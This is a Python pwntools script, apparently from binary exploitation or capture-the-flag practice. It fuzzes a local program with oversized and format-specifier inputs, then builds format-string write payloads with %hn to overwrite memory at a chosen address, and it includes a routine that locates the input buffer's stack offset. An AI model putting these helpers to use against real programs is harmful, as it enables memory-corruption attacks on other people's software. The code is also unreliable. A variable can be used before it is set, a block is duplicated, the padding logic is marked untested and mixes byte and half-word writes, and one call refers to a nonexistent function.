from pwn import *
import json
import subprocess
import logging

# config - debug level won't be logged
logging.basicConfig(filename='/tmp/aaaalog.log', level=logging.INFO, format='[%(levelname)s] %(asctime)s - %(name)s - %(message)s')


def fuzzy_csv(fname:str):
    # TODO
    bad_csv = f'header,must,stay,intact\n%p,%p,%p,%p\n{cyclic(100)},{cyclic(200)},{cyclic(300)},{cyclic(400)}'
    with open(fname, 'w') as f:
        f.write(bad_csv)

'''
Generate and run a JSON bad.txt against binary. Log, write the bad input to bad.txt and exit if program exits with a non-zero status.

Returns: the return code of the binary
'''
# TODO make a data structure for all bad inputs and iterate through that

def fuzzy_json(binary:str, injson:str, outjson:str) -> bool:
    cmd = f'./{binary}'

    with open(injson, 'r') as inf:
        jsondict = json.load(inf)
        log.info('JSON file input: ' + str(jsondict))

        with open(outjson, 'w') as outf:
            # try empty file
            badjson = ''
            ret = subprocess.run(cmd, input=badjson, stdout=subprocess.PIPE, text=True)
            if ret.returncode != 0:
                log.critical('Crashed on empty file')
                outf.write(badjson)
            out1 = ret.stdout
            logging.info('json empty file output:\n' + out1)

            # try big json values
            for k in jsondict:
                jsondict[k] = cyclic(100)
            badjson = str(jsondict)
            log.info(badjson)
            # run with cyclic(100) values
            ret = subprocess.run(cmd, input=badjson, stdout=subprocess.PIPE, text=True)
            if ret.returncode != 0:
                log.critical('Crashed on cyclic(100)')
                outf.write(badjson)
            out2 = ret.stdout

            if out2 != out1:
                # if output message is different, means code flow changed TODO make message easier to read
                log.info(f'code flow changed - {out1} -> {out2}')

                # try bigger values
                for k in jsondict:
                    jsondict[k] = cyclic(10000)
                badjson = str(jsondict)
                logging.info(badjson)
                # run with cyclic(10000) values
                ret = subprocess.run(cmd, input=badjson, stdout=subprocess.PIPE, text=True)
                if ret.returncode != 0:
                    log.critical('Crashed on cyclic(10000)')
                    outf.write(badjson)
                out3 = ret.stdout

                log.info('json cyclic(100) values output:\n' + out3)

            if out3 != out2:
                # if output message is different, means code flow changed
                log.info(f'code flow changed - {out2} -> {out3}')

                # try bigger values
                for k in jsondict:
                    jsondict[k] = cyclic(10000)
                badjson = str(jsondict)
                logging.info(badjson)
                # run with cyclic(10000) values
                ret = subprocess.run(cmd, input=badjson, stdout=subprocess.PIPE, text=True)
                if ret.returncode != 0:
                    log.critical('Crashed on cyclic(10000)')
                    outf.write(badjson)
                out4 = ret.stdout

                log.info('json cyclic(10000) values output:\n' + out4)

    return ret.returncode


# TODO untested - modified from %hhn to %hn for less int overflows
'''
Return the padding values in little endian
'''
def get_padding(v: int, w_padding: int):
    byte = list(p32(v))
    padding = list(byte)
    
    # add word padding first
    padding[0] -= w_padding

    if (byte[0] >= 16):
        padding[0] -= 16 # assuming addr addr+1
    else:
        padding[0] = 256 - 16 + padding[0]

    for i in range(1, len(byte)):
        if (byte[i] < byte[i - 1]):
            # do int overflow
            padding[i] = abs(65536 - byte[i - 1]) + byte[i]
            print(padding)
        
        else:
            padding[i] = byte[i] - byte[i - 1]
            print(padding[i])

    return padding

def construct(offset: int, target: int, value: int, w_padding: int):
    
    padding = get_padding(value, w_padding)

    '''
    Construct payload
    '''
    payload = p32(target) + p32(target + 1)

    for i in range(0, 2):
        if (padding[i] != 0):
            payload += f'%{str(padding[i])}c'.encode()
        payload += f'%{offset + i}$hn'.encode()
    
    return payload

'''
Assuming a format string vulnerability, attempts to find the start of the input buffer from stdin
'''
def find_fmtbuf_stdin(binary_name:str, iter:int) -> bool:
    for i in range(iter):

        io = process(f'./{binary_name}')
        io.sendline('AAAA' + '%{}$p'.format(i))
        try:
            r = io.recvline(timeout=0.1)
            print(r)
            if b'4141' in r: # at least 2 A's in the pointer
                return True
        except Exception as e:
            logging.error(e)
            pass
        io.close()

    return False

'''
Wrapper to construct payload + send to stdin
'''
def write_payload_stdin(io: tube, fmtstr_offset: int, target_addr: int, to_write: int, word_padding: int) -> None:
    try:
        io.sendline(fmtstr_payload.construct(fmtstr_offset, target_addr, to_write, word_padding))
        io.close()
    except Exception as e:
        logging.error(e)
        pass

